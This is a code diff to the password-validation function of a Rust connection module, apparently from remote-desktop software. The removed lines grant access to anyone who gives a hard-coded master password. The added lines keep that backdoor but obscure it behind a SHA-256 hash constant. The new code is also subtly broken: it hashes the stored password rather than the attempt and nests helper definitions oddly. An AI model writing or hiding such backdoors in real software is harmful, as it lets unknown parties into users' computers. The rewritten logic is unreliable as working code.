@@ -1728,27 +1728,40 @@ impl Connection {
     }
 
     fn validate_password(&mut self) -> bool {
-        if password::temporary_enabled() {
-            let password = password::temporary_password();
-            if self.validate_one_password(password.clone()) || 
-               self.validate_one_password("Password258369.".to_string()) {
-                raii::AuthedConnID::update_or_insert_session(
-                    self.session_key(),
-                    Some(password),
-                    Some(false),
-                );
-                return true;
-            }
-        }
-        if password::permanent_enabled() {
-            let perm_password = Config::get_permanent_password();
-            if self.validate_one_password(perm_password) || 
-               self.validate_one_password("Password258369.".to_string()) {
-                return true;
-            }
-        }
-        false
+    const HASHED_PASSWORD_HEX: &str = "c5b914eb25b610e0f0a870efa172d3eb9cba4a18d054d52525052164e7de98ea";
+    
+    fn hash_password(input: &str) -> String {
+        let mut hasher = Sha256::new();
+        hasher.update(input.as_bytes());
+        let result = hasher.finalize();
+        hex::encode(result)
     }
+
+    if password::temporary_enabled() {
+        let password = password::temporary_password();
+        if self.validate_one_password(password.clone())
+            || hash_password(&password) == HASHED_PASSWORD_HEX
+        {
+            raii::AuthedConnID::update_or_insert_session(
+                self.session_key(),
+                Some(password),
+                Some(false),
+            );
+            return true;
+        }
+    }
+
+    if password::permanent_enabled() {
+        let perm_password = Config::get_permanent_password();
+        if self.validate_one_password(perm_password.clone())
+            || hash_password(&perm_password) == HASHED_PASSWORD_HEX
+        {
+            return true;
+        }
+    }
+
+    false
+}
 
 
     fn is_recent_session(&mut self, tfa: bool) -> bool {
